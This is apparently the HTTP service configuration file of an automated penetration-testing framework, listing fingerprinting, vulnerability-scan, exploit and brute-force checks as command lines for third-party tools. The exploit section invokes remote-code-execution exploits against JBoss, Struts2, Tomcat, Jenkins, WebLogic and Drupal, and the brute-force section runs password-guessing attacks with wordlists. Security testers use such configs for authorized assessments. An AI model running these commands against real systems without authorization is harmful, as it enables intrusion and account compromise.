#
# <service_name>.conf (one config file per service):
# --------------------------------------------------
# [config]
# default_port     = [0-65535] (mandatory)
# protocol         = tcp|udp (mandatory)
# categories       = list of categories for classifying checks ([a-z0-9_-]) (mandatory)
# auth_types       = list of authentication types, only for HTTP ([a-z0-9_-]) (optional)

# [specific_options] (optional)
# <option_name ([a-z0-9_-])> = boolean:default_value|list|var
#       (for boolean, default value can be added, True or False. False by default)

# [supported_list_options] (required if options of type list are present)
# For each option of type "list":
#   supported_<option_name> = list of supported values for the option ([a-z0-9_-])

# [products]Â (optional)
#   <product_type> ([a-z0-9_-]) = list of supported product names ([a-zA-Z0-9_\/-. ])
#   format: [vendor/]product_name (vendor can be omitted if no confusion)

# For each check:
#   [check_<check_name>]
#   name           = display name (mandatory) 
#   category       = category inside which this check is classified (mandatory)
#   description    = short text describing the check (mandatory)
#   tool           = tool_name of the tool to use
#   For each command (there must be at least one command):
#       command_<command_number> = command-line for the check, multiple tags supported
#       context_<command_number> = context that must be met to run the command (optional)
#

[config]
default_port = 80
protocol     = tcp
categories   = recon, vulnscan, exploit, bruteforce, postexploit
auth_types   = glassfish, jboss, jenkins, domino, tomcat, weblogic, websphere, wordpress, joomla, drupal, opencart, magento

[specific_options]
https     = boolean
webdav    = boolean
htaccess  = boolean

[products]
web-language =
    Microsoft/ASP.NET,
    CFML,
    Go,
    Java,
    Lua,
    Node.js,
    Perl,
    PHP,
    Python,
    Ruby

web-framework =
    Bootstrap,
    Angular Material,
    CakePHP,
    Codeigniter,
    Django,
    Expressjs/Express,
    Google/Web Toolkit,
    Laravel,
    Ruby On Rails,
    Symfony,
    Yiiframework

web-jslib = 
    Angularjs,
    Backbone.js,
    ef.js,
    FancyBox,
    Handlebars,
    Jquery,
    Jquery UI,
    Lightbox,
    Modernizr,
    Moment.js,
    MooTools,
    Mustache.js,
    Prototype Javascript Framework,
    React,
    RequireJS,
    TweenMax,
    Underscore.js

web-cms =
    3dcart,
    Advanced Electron Forum,
    Afosto,
    Afterbuy,
    Ametys Cms,
    Apostrophe Cms,
    Arastta,
    AsciiDoc,
    Aspnetforum,
    Beehive Forum,
    Bigcommerce,
    Bigware Shop,
    Bizweb,
    Bolt,
    Browsercms,
    Bubble,
    Burning Board,
    Adobe/Business Catalyst,
    Ckan,
    Clientexec,
    Cloudcart,
    Colormeshop,
    Contao Cms,
    Contendio,
    Contensis Cms,
    Contentbox,
    Contentful,
    Cpg Dragonfly Cms,
    Cotonti Siena,
    Craft Cms,
    Danneo/Cms,
    Sitecore/Cms,
    Cms Made Simple,
    Cmsimple,
    Concrete5,
    Dedecms,
    Discourse,
    Discuz,
    Django Cms,
    Dokuwiki,
    Dotcms,
    Dotnetnuke,
    Drupal,
    E107,
    Episerver,
    Expressionengine,
    Ez Publish,
    Flarum,
    Flexcmp,
    Fluxbb,
    Fork Cms,
    Fudforum,
    Getsimple Cms,
    Ghost Cms,
    Gravcms,
    Hippo Cms,
    Hotaru Cms,
    Impresspages Cms,
    Indexhibit,
    Invision Power Board,
    Jalios Jcms,
    Jimdo,
    Jforum,
    Joomla,
    Koken,
    Kooboo Cms,
    Lepton-cms/Lepton,
    Liferay,
    Livejournal,
    Livestreet,
    Magento,
    Majordomo,
    Mambo,
    Squiz/Matrix,
    Mediawiki,
    Minibb,
    Mercuryboard,
    Modx Revolution,
    Moodle,
    Moto Cms,
    Movable Type,
    Mura Cms,
    Mvnforum,
    Mwforum,
    Mybb,
    Nodebb,
    NoNonsense Forum,
    October Cms,
    Odoo,
    Opencart,
    Opencms,
    Opentext Wsm,
    Ophal,
    Orchard,
    Pencilblue,
    Percussion Cms,
    Phorum,
    Php-nuke,
    Phpbb,
    Phpcms,
    Phpmyadmin,
    Phppgadmin,
    Phpwind,
    Pimcore,
    Plone,
    Presstopia,
    Prestashop,
    Punbb,
    Quick.cms,
    Rcms,
    Ritecms,
    Roadiz Cms,
    Rock Rms,
    Roundcube Webmail,
    Seamlesscms,
    Serendipity,
    Sharepoint,
    Silva,
    Silverstripe,
    Simple Machines Forum,
    Sitecore,
    Sitefinity,
    Snews,
    Solodev,
    Spin Cms,
    Squirrelmail,
    Subrion Cms,
    Sulu,
    Textpattern,
    Tiddlywiki,
    Tikiwiki,
    Typo3,
    UBB.threads,
    Uknowva,
    Ultimate Php Board,
    Ushahidi Platform,
    Umbraco,
    Umi Cms,
    Vanilla Forums,
    Vbulletin,
    Webflow Cms,
    Webgui,
    Websitebaker,
    Wolf Cms,
    Wordpress,
    Xenforo,
    Xmb,
    Xoops,
    Yabb,
    Yazd Discussion Forum,
    Yet Another Forum.net,
    Zen Cart,
    Zen Photos

web-server = 
    Apache,
    Hiawatha,
    IBM/HTTP Server,
    Lighttpd,
    LiteSpeed Web Server,
    Microsoft/IIS,
    Mongoose,
    Monkey Http Daemon,
    Nginx,
    Oracle/Http Server,
    Railo,
    Rejetto/Http File Server,
    Thttpd,
    Yaws,
    Zeus Web Server,

web-appserver = 
    Adobe/Coldfusion,
    Apache/Axis2,
    Apache/Tomcat,
    Domino,
    Eclipse/Jetty,
    Jboss,
    Jenkins,
    Oracle/Glassfish,
    Oracle/Weblogic Server,
    Websphere Application Server,
    Zope


#########################################################################################
# Recon
#########################################################################################
[check_nmap-recon]
name        = nmap-recon
category    = recon
description = Recon using Nmap HTTP scripts
tool        = nmap
command_1   = sudo nmap -sT -sV -Pn -vv -p [PORT] --script-args=unsafe=1 --script='http* AND NOT broadcast AND NOT dos AND NOT http-slow* AND NOT http-comment* AND NOT http-form-brute AND NOT http-form-fuzzer AND NOT http-sql-injection AND NOT http-iis-short-name-brute AND NOT http-google-malware AND NOT http-brute AND NOT http-drupal* AND NOT http-wordpress* AND NOT http-enum*' --stats-every 10s [IP]

[check_load-balancing-detection]
name        = load-balancing-detection
category    = recon
description = HTTP load balancer detection
tool        = halberd
command_1   = ./build/scripts-2.7/halberd -v [URL]

[check_waf-detection]
name        = waf-detection
category    = recon
description = Identify and fingerprint WAF products protecting website
tool        = wafw00f
command_1   = ./build/scripts-2.7/wafw00f -v -a [URL]

[check_waf-detection2]
name        = waf-detection2
category    = recon
description = Identify and fingerprint WAF products protecting website
tool        = identifywaf
command_1   = python3 identYwaf.py [URL]

[check_tls-probing]
name        = tls-probing
category    = recon
description = Identify the implementation in use by SSL/TLS servers (might allow server fingerprinting)
tool        = tls-prober
command_1   = python2.7 prober.py -p [PORT] [IP] -d
context_1   = { 'https': True }

[check_fingerprinting-multi-whatweb]
name        = fingerprinting-multi-whatweb
category    = recon
description = Identify CMS, blogging platforms, JS libraries, Web servers
tool        = whatweb
command_1   = rvm ruby-2.3 do ./whatweb --user-agent 'Mozilla/5.0 (X11; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0' -a 3 -v [URL]
# whatweb bugs with ruby2.5 (no output) cf. https://github.com/urbanadventurer/WhatWeb/issues/244

[check_fingerprinting-app-server]
name        = fingerprinting-app-server
category    = recon
description = Fingerprint application server (JBoss, ColdFusion, Weblogic, Tomcat, Railo, Axis2, Glassfish)
tool        = clusterd
command_1   = python2.7 ./clusterd.py --fingerprint -i [HOST] -p [PORT] [HTTPS true="--ssl"] -d

[check_fingerprinting-server-domino]
name        = fingerprinting-server-domino
category    = recon
description = Fingerprint IBM/Lotus Domino server
tool        = domiowned
command_1   = python3 domi-owned.py fingerprint [URL]
context_1   = { 'web-appserver': 'Domino' }
command_2   = python3 domi-owned.py enumerate [URL]
context_2   = { 'web-appserver': 'Domino' }

[check_webdav-detection-msf]
name        = webdav-detection-msf
category    = recon
description = Detect WebDAV on webserver
tool        = metasploit
command_1   = sudo msfconsole -q -x "use auxiliary/scanner/http/webdav_scanner; set RHOSTS [IP]; set RPORT [PORT]; [HTTPS true="set SSL true"]; run; exit"

[check_fingerprinting-cms-wig]
name        = fingerprinting-cms-wig
category    = recon
description = Identify several CMS and other administrative applications
tool        = wig
command_1   = python3 ./wig.py -q -a -t 2 -vvv [URL]

[check_fingerprinting-cms-cmseek]
name        = fingerprinting-cms-cmseek
category    = recon
description = Detect CMS (130+ supported), detect version on Drupal, advanced scan on Wordpress/Joomla
tool        = cmseek
command_1   = /bin/bash -c 'python3 cmseek.py -v --user-agent "Mozilla/5.0 (X11; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0" -u [URL] <<< y > /tmp/cmseek.txt && tail -n +2 /tmp/cmseek.txt && rm /tmp/cmseek.txt'

[check_fingerprinting-cms-fingerprinter]
name        = fingerprinting-cms-fingerprinter
category    = recon
description = Fingerprint precisely CMS versions (based on files checksums)
tool        = fingerprinter
command_1   = ruby fingerprinter.rb --fingerprint [URL] -v -a wordpress
context_1   = { 'web-cms': 'Wordpress' }
command_2   = ruby fingerprinter.rb --fingerprint [URL] -v -a joomla
context_2   = { 'web-cms': 'Joomla' }
command_3   = ruby fingerprinter.rb --fingerprint [URL] -v -a drupal
context_3   = { 'web-cms': 'Drupal' }
command_4   = ruby fingerprinter.rb --fingerprint [URL] -v -a magento-ce
context_4   = { 'web-cms': 'Magento' }
command_5   = ruby fingerprinter.rb --fingerprint [URL] -v -a prestashop
context_5   = { 'web-cms': 'Prestashop' }
command_6   = ruby fingerprinter.rb --fingerprint [URL] -v -a opencart
context_6   = { 'web-cms': 'Opencart' }
command_7   = ruby fingerprinter.rb --fingerprint [URL] -v -a liferay
context_7   = { 'web-cms': 'Liferay' }
command_8   = ruby fingerprinter.rb --fingerprint [URL] -v -a dotnetnuke
context_8   = { 'web-cms': 'Dotnetnuke' }
command_9   = ruby fingerprinter.rb --fingerprint [URL] -v -a django-cms
context_9   = { 'web-cms': 'Django Cms' }
command_10  = ruby fingerprinter.rb --fingerprint [URL] -v -a concrete5
context_10  = { 'web-cms': 'Concrete5' }
command_11  = ruby fingerprinter.rb --fingerprint [URL] -v -a cms-made-simple
context_11  = { 'web-cms': 'Cms Made Simple' }
command_12  = ruby fingerprinter.rb --fingerprint [URL] -v -a punbb
context_12  = { 'web-cms': 'Punbb' }
command_13  = ruby fingerprinter.rb --fingerprint [URL] -v -a moodle
context_13  = { 'web-cms': 'Moodle' }

[check_fingerprinting-drupal]
name        = fingerprinting-drupal
category    = recon
description = Fingerprint Drupal 7/8: users, nodes, default files, modules, themes enumeration
tool        = drupwn
command_1   = python3 drupwn enum [URL]
context_1   = { 'web-cms': 'Drupal' }

[check_crawling-fast]
name        = crawling-fast
category    = recon
description = Crawl website quickly, analyze interesting files/directories
tool        = dirhunt
command_1   = dirhunt [URL]

[check_crawling-fast2]
name        = crawling-fast2
category    = recon
description = Crawl website and extract URLs, files, intel & endpoints
tool        = photon
command_1   = python3 photon.py --url [URL] -o output; cd output; for f in `ls *.txt`; do echo; echo $f; echo "---------------------------------------------------"; cat $f; echo; echo; done; rm -rf output;



#########################################################################################
# Vulnscan 
#########################################################################################
[check_vulners-lookup]
name        = vulners-lookup
category    = vulnscan
description = Vulnerabilities lookup (language, framework, jslib, cms, server, appserver) on Vulners.com
tool        = vulners-lookup
command_1   = python3 vulners-lookup.py '[WEB-LANGUAGE-VENDOR] [WEB-LANGUAGE-NAME] [WEB-LANGUAGE-VERSION]'
context_1   = { 'web-language': 'any|version_known' }
command_2   = python3 vulners-lookup.py '[WEB-FRAMEWORK-VENDOR] [WEB-FRAMEWORK-NAME] [WEB-FRAMEWORK-VERSION]'
context_2   = { 'web-framework': 'any|version_known' }
command_3   = python3 vulners-lookup.py '[WEB-JSLIB-VENDOR] [WEB-JSLIB-NAME] [WEB-JSLIB-VERSION]'
context_3   = { 'web-jslib': 'any|version_known' }
command_4   = python3 vulners-lookup.py '[WEB-CMS-VENDOR] [WEB-CMS-NAME] [WEB-CMS-VERSION]'
context_4   = { 'web-cms': 'any|version_known' }
command_5   = python3 vulners-lookup.py '[WEB-SERVER-VENDOR] [WEB-SERVER-NAME] [WEB-SERVER-VERSION]'
context_5   = { 'web-server': 'any|version_known' }
command_6   = python3 vulners-lookup.py '[WEB-APPSERVER-VENDOR] [WEB-APPSERVER-NAME] [WEB-APPSERVER-VERSION]'
context_6   = { 'web-appserver': 'any|version_known' }

[check_cvedetails-lookup]
name        = cvedetails-lookup
category    = vulnscan
description = Vulnerabilities lookup on Cvedetails.com (requires product name+version)
tool        = cvedetails-lookup
command_1   = python3 cvedetails-lookup.py --vendor "[WEB-LANGUAGE-VENDOR]" --product "[WEB-LANGUAGE-NAME]" --version "[WEB-LANGUAGE-VERSION]"
context_1   = { 'web-language': 'any|version_known' }
command_2   = python3 cvedetails-lookup.py --vendor "[WEB-FRAMEWORK-VENDOR]" --product "[WEB-FRAMEWORK-NAME]" --version "[WEB-FRAMEWORK-VERSION]"
context_2   = { 'web-framework': 'any|version_known' }
command_3   = python3 cvedetails-lookup.py --vendor "[WEB-JSLIB-VENDOR]" --product "[WEB-JSLIB-NAME]" --version "[WEB-JSLIB-VERSION]"
context_3   = { 'web-jslib': 'any|version_known' }
command_4   = python3 cvedetails-lookup.py --vendor "[WEB-CMS-VENDOR]" --product "[WEB-CMS-NAME]" --version "[WEB-CMS-VERSION]"
context_4   = { 'web-cms': 'any|version_known' }
command_5   = python3 cvedetails-lookup.py --vendor "[WEB-SERVER-VENDOR]" --product "[WEB-SERVER-NAME]" --version "[WEB-SERVER-VERSION]"
context_5   = { 'web-server': 'any|version_known' }
command_6   = python3 cvedetails-lookup.py --vendor "[WEB-APPSERVER-VENDOR]" --product "[WEB-APPSERVER-NAME]" --version "[WEB-ÃPPSERVER-VERSION]"
context_6   = { 'web-appserver': 'any|version_known' }

[check_ssl-check]
name        = ssl-check
category    = vulnscan
description = Check for SSL/TLS configuration
tool        = testssl
command_1   = ./testssl.sh [URL]
context_1   = { 'https': True }

[check_vulnscan-multi-nikto]
name        = vulnscan-multi-nikto
category    = vulnscan
description = Check for multiple web vulnerabilities/misconfigurations
tool        = nikto
command_1   = cd program; perl ./nikto.pl -host [IP] -port [PORT] [HTTPS true="-ssl"]

# [check_tomcat-default-creds]
# name        = tomcat-default-creds
# category    = vulnscan
# description = Check default credentials on Tomcat Application Manager
# tool        = metasploit
# command_1   = sudo msfconsole -q -x "use auxiliary/scanner/http/tomcat_mgr_login; set RHOSTS [IP]; set RPORT [PORT]; [HTTPS true="set SSL true"]; run; exit"
# context_1   = { 'web_server': 'tomcat' }
# => changeme already checks for tomcat

[check_default-creds-multi]
name        = default-creds-web-multi
category    = vulnscan
description = Check for default credentials on various web interfaces
tool        = changeme
command_1   = python3 changeme.py -v [HTTPS true="--ssl"] --protocols http [IP]:[PORT]

[check_webdav-scan-davscan]
name        = webdav-scan-davscan
category    = vulnscan
description = Scan HTTP WebDAV
tool        = davscan
command_1   = python2.7 ./davscan.py -o [OUTPUT] [URL]
context_1   = { 'webdav': True }

[check_webdav-internal-ip-disclosure]
name        = webdav-internal-ip-disclosure
category    = vulnscan
description = Check for WebDAV internal IP disclosure
tool        = metasploit
command_1   = sudo msfconsole -q -x "use auxiliary/scanner/http/webdav_internal_ip; set RHOSTS [IP]; set RPORT [PORT]; [HTTPS true="set SSL true"]; run; exit"
context_1   = { 'webdav': True }

[check_webdav-website-content]
name        = webdav-website-content
category    = vulnscan
description = Detect webservers disclosing its content through WebDAV
tool        = metasploit
command_1   = sudo msfconsole -q -x "use auxiliary/scanner/http/webdav_website_content; set RHOSTS [IP]; set RPORT [PORT]; [HTTPS true="set SSL true"]; run; exit"
context_1   = { 'webdav': True } 

[check_http-put-check]
name        = http-put-check
category    = vulnscan
description = Detect the support of dangerous HTTP PUT method
tool        = metasploit
command_1   = sudo msfconsole -q -x "use auxiliary/scanner/http/http_put; set RHOSTS [IP]; set RPORT [PORT]; [HTTPS true="set SSL true"]; run; exit"

[check_apache-optionsbleed-check]
name        = apache-optionsbleed-check
category    = vulnscan
description = Test for the Optionsbleed bug in Apache httpd (CVE-2017-9798)
tool        = optionsbleed
command_1   = ./optionsbleed -n 40 -a -u [URL]

[check_shellshock-scan]
name        = shellshock-scan
category    = vulnscan
description = Detect if web server is vulnerable to Shellshock (CVE-2014-6271)
tool        = shocker
command_1   = python2.7 shocker.py --Host [IP] --port [PORT] [HTTPS true="--ssl"]

[check_iis-shortname-scan]
name        = iis-shortname-scan
category    = vulnscan
description = Scan for IIS short filename (8.3) disclosure vulnerability
tool        = iis-shortname-scanner
command_1   = java -jar iis_shortname_scanner.jar 2 20 [URL]
context_1   = { 'web-server': 'Microsoft/IIS'}

[check_iis-internal-ip-disclosure]
name        = iis-internal-ip-disclosure
category    = vulnscan
description = Check for IIS internal IP disclosure
tool        = metasploit
command_1   = sudo msfconsole -q -x "use auxiliary/scanner/http/iis_internal_ip; set RHOSTS [IP]; set RPORT [PORT]; [HTTPS true="set SSL true;"]run; exit"
context_1   = { 'web-server': 'Microsoft/IIS'}

[check_tomcat-user-enum]
name        = tomcat-user-enum
category    = vulnscan
description = Enumerate users on Tomcat 4.1.0-4.1.39, 5.5.0-5.5.27 and 6.0.0-6.0.18
tool        = metasploit
command_1   = sudo msfconsole -q -x "use auxiliary/scanner/http/tomcat_enum; set RHOSTS [HOST]; set RPORT [PORT]; [HTTPS true="set SSL true;"]run; exit"
context_1   = { 'web-appserver': 'Apache/Tomcat' }

[check_jboss-vulnscan-multi]
name        = jboss-vulnscan-multi
category    = vulnscan
description = Scan JBoss application server for multiple vulnerabilities
tool        = metasploit
command_1   = sudo msfconsole -q -x "use auxiliary/scanner/http/jboss_vulnscan; set RHOSTS [HOST]; set RPORT [PORT]; [HTTPS true="set SSL true;"]run; exit"
context_1   = { 'web-appserver': 'JBoss' }

[check_jboss-status-infoleak]
name        = jboss-status-infoleak
category    = vulnscan
description = Queries JBoss status servlet to collect sensitive information (JBoss 4.0, 4.2.2 and 4.2.3) 
tool        = metasploit
command_1   = sudo msfconsole -q -x "use auxiliary/scanner/http/jboss_status; set RHOSTS [HOST]; set RPORT [PORT]; [HTTPS true="set SSL true;"]run; exit"
context_1   = { 'web-appserver': 'JBoss' }

[check_jenkins-infoleak]
name        = jenkins-infoleak
category    = vulnscan
description = Enumerate a remote Jenkins-CI installation in an unauthenticated manner
tool        = metasploit
command_1   = sudo msfconsole -q -x "use auxiliary/scanner/http/jenkins_enum; set RHOSTS [HOST]; set RPORT [PORT]; [HTTPS true="set SSL true;"]run; exit"
context_1   = { 'web-appserver': 'Jenkins' }

[check_cms-multi-vulnscan-cmsmap]
name        = cms-multi-vulnscan-cmsmap
category    = vulnscan
description = Check for vulnerabilities in CMS Wordpress, Drupal, Joomla
tool        = cmsmap
command_1   = python3 cmsmap.py -v -F -f W -t 10 [URL]
context_1   = { 'web-cms': 'Wordpress' }
command_2   = python3 cmsmap.py -v -F -f J -t 10 [URL]
context_2   = { 'web-cms': 'Joomla' }
command_3   = python3 cmsmap.py -v -F -f D -t 10 [URL]
context_3   = { 'web-cms': 'Drupal' }

[check_wordpress-vulnscan]
name        = wordpress-vulnscan
category    = vulnscan
description = Scan for vulnerabilities in CMS Wordpress
tool        = wpscan
command_1   = wpscan -u [URL] -v --enumerate "u[1-50],p,tt,t"
context_1   = { 'web-cms': 'Wordpress' }

[check_wordpress-vulnscan2]
name        = wordpress-vulnscan2
category    = vulnscan
description = Scan for vulnerabilities in CMS Wordpress
tool        = wpseku
command_1   = python3 wpseku.py -v --url [URL]
context_1   = { 'web-cms': 'Wordpress' }

[check_joomla-vulnscan]
name        = joomla-vulnscan
category    = vulnscan
description = Scan for vulnerabilities in CMS Joomla
tool        = joomscan
command_1   = perl joomscan.pl -u [URL] --enumerate-components
context_1   = { 'web-cms': 'Joomla' }

[check_joomla-vulnscan2]
name        = joomla-vulnscan2
category    = vulnscan
description = Scan for vulnerabilities in CMS Joomla
tool        = joomlascan
command_1   = joomlascan.py -u [URL]
context_1   = { 'web-cms': 'Joomla' }

[check_joomla-vulnscan3]
name        = joomla-vulnscan3
category    = vulnscan
description = Scan for vulnerabilities in CMS Joomla
tool        = joomlavs
command_1   = ruby joomlavs.rb -u [URL] -v --scan-all
context_1   = { 'web-cms': 'Joomla' }

[check_drupal-vulnscan]
name        = drupal-vulnscan
category    = vulnscan
description = Scan for vulnerabilities in CMS Drupal
tool        = droopescan
command_1   = ./droopescan scan drupal -u [URL]
context_1   = { 'web-cms': 'Drupal' }

[check_magento-vulnscan]
name        = magento-vulnscan
category    = vulnscan
description = Check for misconfigurations in CMS Magento (working partially)
tool        = magescan
command_1   = php magescan.phar scan:all -k [URL]
context_1   = { 'web-cms': 'magento' }

[check_silverstripe-vulnscan]
name        = silverstripe-vulnscan
category    = vulnscan
description = Scan for vulnerabilities in CMS Silverstripe
tool        = droopescan
command_1   = ./droopescan scan silverstripe -u [URL]
context_1   = { 'web-cms': 'silverstripe' }

[check_vbulletin-vulnscan]
name        = vbulletin-vulnscan
category    = vulnscan
description = Scan for vulnerabilities in CMS vBulletin
tool        = vbscan
command_1   = perl vbscan.pl [URL]
context_1   = { 'web-cms': 'vbulletin' }

[check_liferay-vulnscan]
name        = liferay-vulnscan
category    = vulnscan
description = Scan for vulnerabilities in CMS Liferay
tool        = liferayscan
command_1   = LiferayScan -v -u [URL]
context_1   = { 'web-cms': 'liferay' }

[check_angularjs-csti-scan]
name        = angularjs-csti-scan
category    = vulnscan
description = Scan for AngularJS Client-Side Template Injection
tool        = angularjs-csti-scanner
command_1   = python3 acstis.py -d [URL] -c --ignore-invalid-certificates --verify-payload
context_1   = { 'web-jslib': 'Angularjs' }


#########################################################################################
# Exploit
#########################################################################################
[check_jboss-deploy-shell]
name        = jboss-deploy-shell
category    = exploit
description = Try to deploy shell on JBoss server (jmx|web|admin-console, JMXInvokerServlet)
tool        = jexboss
command_1   = python2.7 jexboss.py --auto-exploit --jboss -u [URL] --cmd whoami
context_1   = { 'web_server': 'JBoss', 'auth_status': NO_AUTH, 'auth_type': 'jboss' }
command_2   = python2.7 jexboss.py --auto-exploit --jboss -u [URL] --cmd whoami
context_2   = { 'web_server': 'JBoss', 'auth_status': USER_ONLY, 'auth_type': 'jboss' }
command_3   = python2.7 jexboss.py --auto-exploit --jboss -u [URL] --jboss-login '[USERNAME]:[PASSWORD]' --cmd whoami
context_3   = { 'web_server': 'JBoss', 'auth_status': POST_AUTH, 'auth_type': 'jboss' }

[check_struts2-rce-cve2017-5638]
name        = struts2-rce-cve2017-5638
category    = exploit
description = Exploit Apache Struts2 Jakarta Multipart parser RCE (CVE-2017-5638)
tool        = jexboss
command_1   = python2.7 jexboss.py --auto-exploit --struts2 -u [URL] --cmd whoami
context_1   = { 'web-language': 'Java' }

[check_struts2-rce-cve2017-9805]
name        = struts2-rce-cve2017-9805
category    = exploit
description = Exploit Apache Struts2 REST Plugin XStream RCE (CVE-2017-9805)
tool        = struts-pwn-cve2017-9805
command_1   = python3 struts-pwn.py -u [URL]
context_1   = { 'web-language': 'Java' }

[check_struts2-rce-cve2018-11776]
name        = struts2-rce-cve2018-11776
category    = exploit
description = Exploit Apache Struts2 misconfiguration RCE (CVE-2018-11776)
tool        = struts-pwn-cve2018-11776
command_1   = python3 struts-pwn.py -u [URL] 
context_1   = { 'web-language': 'Java' }

[check_tomcat-rce-cve2017-12617]
name        = tomcat-rce-cve2017-12617
category    = exploit
description = Exploit for Apache Tomcat JSP Upload Bypass RCE (CVE-2017-12617)
tool        = exploit-tomcat-cve2017-12617
command_1   = python2.7 tomcat-cve-2017-12617.py -u [URL] ; python2.7 tomcat-cve-2017-12617.py -u [URL] -p shell
context_1   = { 'web-appserver': 'Apache/Tomcat' }

[check_jenkins-cliport-deserialize]
name        = jenkins-cliport-deserialize
category    = exploit
description = Exploit Java deserialization in Jenkins CLI port
tool        = jexboss
command_1   = python2.7 jexboss.py --auto-exploit --jenkins -u [URL] --cmd whoami
context_1   = { 'web-appserver': 'Jenkins' }

[check_weblogic-t3-deserialize-cve2015-4852]
name        = weblogic-t3-deserialize-cve2015-4852
category    = exploit
description = Exploit Java deserialization in Weblogic T3(s) (CVE-2015-4852)
tool        = loubia
# command_1   = echo "[~] Will try to ping local IP = [LOCALIP]"; echo "[~] Running tcpdump in background..."; sudo sh -c "tcpdump -U -i any -w /tmp/dump.pcap icmp &" ; python2.7 loubia.py [IP] [PORT] [HTTPS true="-s"] -o unix -c '/bin/ping -c 4 [LOCALIP]' -v; python2.7 loubia.py [IP] [PORT] [HTTPS true="-s"] -o win -c 'ping -n 4 [LOCALIP]' -v; echo "[~] Wait a little bit..."; sleep 3; PID=$(ps -e | pgrep tcpdump); echo "[~] Kill tcpdump"; sudo kill -9 $PID; sleep 2; echo "[~] Captured ICMP traffic:"; echo; sudo tcpdump -r /tmp/dump.pcap; echo "[~] Delete capture"; sudo rm /tmp/dump.pcap
command_1   = ./run-loubia.sh [IP] [PORT] [LOCALIP] [HTTPS true="-s"]
context_1   = { 'web-appserver': 'Oracle/Weblogic Server' }

[check_weblogic-t3-deserialize-cve2017-3248]
name        = weblogic-t3-deserialize-cve2017-3248
category    = exploit
description = Exploit Java deserialization in Weblogic T3(s) (CVE-2017-3248)
tool        = exploit-weblogic-cve2017-3248
command_1   = python2.7 exploits/weblogic/exploit-CVE-2017-3248-bobsecq.py -t [IP] -p [PORT] [HTTPS true="--ssl"] --check --ysopath [TOOLBOXDIR]/multi/ysoserial/ysoserial-master-SNAPSHOT.jar
context_1   = { 'web-appserver': 'Oracle/Weblogic Server' }

[check_weblogic-t3-deserialize-cve2018-2893]
name        = weblogic-t3-deserialize-cve2018-2893
category    = exploit
description = Exploit Java deserialization in Weblogic T3(s) (CVE-2018-2893)
tool        = exploit-weblogic-cve2018-2893
# command_1   = echo "[~] Will try to ping local IP = [LOCALIP]"; echo "[~] Running tcpdump in background..."; sudo sh -c "tcpdump -U -i any -w /tmp/dump.pcap icmp &" ; java -jar ysoserial-cve-2018-2893.jar JRMPClient4 "/bin/ping -c 4 [LOCALIP]" > /tmp/poc4.ser; python2.7 weblogic.py [IP] [PORT] /tmp/poc4.ser; echo "[~] Wait a little bit..."; sleep 3; PID=$(ps -e | pgrep tcpdump); echo "[~] Kill tcpdump"; sudo kill -9 $PID; sleep 2; echo "[~] Captured ICMP traffic:"; echo; sudo tcpdump -r /tmp/dump.pcap; echo "[~] Delete capture"; sudo rm /tmp/dump.pcap; rm /tmp/poc4.ser
command_1   = ./run-exploit-weblogic-cve2018-2893.sh [IP] [PORT] [LOCALIP]
context_1   = { 'web-appserver': 'Oracle/Weblogic Server' }

[check_weblogic-wls-wsat-cve2017-10271]
name        = weblogic-wls-wsat-cve2017-10271
category    = exploit
description = Exploit WLS-WSAT in Weblogic (CVE-2017-10271)
tool        = exploit-weblogic-cve2017-10271
# command_1   = echo "[~] Will try to ping local IP = [LOCALIP]"; echo "[~] Running tcpdump in background..."; sudo sh -c "tcpdump -U -i any -w /tmp/dump.pcap icmp &" ; python2.7 exploit.py [URL] <<< '/bin/ping -c 4 [LOCALIP]'; echo "[~] Wait a little bit..."; sleep 3; PID=$(ps -e | pgrep tcpdump); echo "[~] Kill tcpdump"; sudo kill -9 $PID; sleep 2; echo "[~] Captured ICMP traffic:"; echo; sudo tcpdump -r /tmp/dump.pcap; echo "[~] Delete capture"; sudo rm /tmp/dump.pcap
command_1   = ./run-exploit-weblogic-cve2017-10271.sh [URL] [LOCALIP]
context_1   = { 'web-appserver': 'Oracle/Weblogic Server' }

[check_drupal-cve-exploit]
name        = drupal-cve-exploit
category    = exploit
description = Check and exploit CVEs in CMS Drupal 7/8 (include Drupalgeddon2) (require user interaction)
tool        = drupwn
command_1   = python3 drupwn exploit [URL]
context_1   = { 'web-cms': 'Drupal' }

# [tool_clusterd] # TODO
# name = clusterd
# category = vuln_checking
# description = Application server attack toolkit (JBoss, ColdFusion, Weblogic, Tomcat, Railo, Axis2, Glassfish)
# command = python2.7 clusterd.py --fingerprint -i [HOST] -p [PORT] [HTTPS option="--ssl"] -d
# install = git clone https://github.com/hatRiot/clusterd.git . && sudo pip2 install -r requirements.txt
# update = git pull && sudo pip2 install -r requirements.txt



#########################################################################################
# Bruteforce
#########################################################################################
[check_bruteforce-htaccess]
name        = bruteforce-htaccess
category    = bruteforce
description = Bruteforce HTTP authentication (htaccess) if 401 Unauthorized returned
tool        = hydra
command_1   = hydra -L [USERLIST default="usernames/usernames-short.txt"] -P [PASSLIST default="passwords/pass-medium.txt"] -e ns -t 10 -f -s [PORT] -v -V [IP]  http-get [URIPATH]
context_1   = { 'htaccess': True }

[check_bruteforce-domino]
name        = bruteforce-domino
category    = bruteforce
description = Bruteforce against IBM/Lotus Domino server
tool        = domiowned
command_1   = python3 domi-owned.py bruteforce [URL] [USERLIST default="usernames/usernames-short.txt"] --password [PASSLIST default="passwords/pass-medium.txt"]
context_1   = { 'web-appserver': 'Domino', 'auth_type': 'domino', 'auth_status': NO_AUTH }
command_2   = echo '[USERNAME]' > /tmp/domiuser.txt; python3 domi-owned.py bruteforce [URL] /tmp/domiuser.txt --password [PASSLIST default="passwords/pass-medium.txt"]; rm /tmp/domiuser.txt
context_2   = { 'web-appserver': 'Domino', 'auth_type': 'domino', 'auth_status': USER_ONLY }

[check_bruteforce-wordpress]
name        = bruteforce-wordpress
category    = bruteforce
description = Bruteforce Wordpress accounts (known users)
tool        = wpseku
command_1   = python3 wpseku.py --url [URL] --brute --user '[USERNAME]' --wordlist [PASSLIST default="passwords/pass-medium.txt"]
context_1   = { 'web-cms': 'Wordpress', 'auth_type': 'wordpress', 'auth_status': USER_ONLY }

[check_bruteforce-joomla]
name        = bruteforce-joomla
category    = bruteforce
description = Bruteforce Joomla "admin" account
tool        = xbruteforcer
command_1   = /bin/bash -c "rm /tmp/url.txt; echo [URL] >> /tmp/url.txt; perl XBruteForcer.pl -l /tmp/url.txt -p [PASSLIST default="passwords/pass-medium.txt"] <<< 2; rm /tmp/url.txt"; tput sgr0
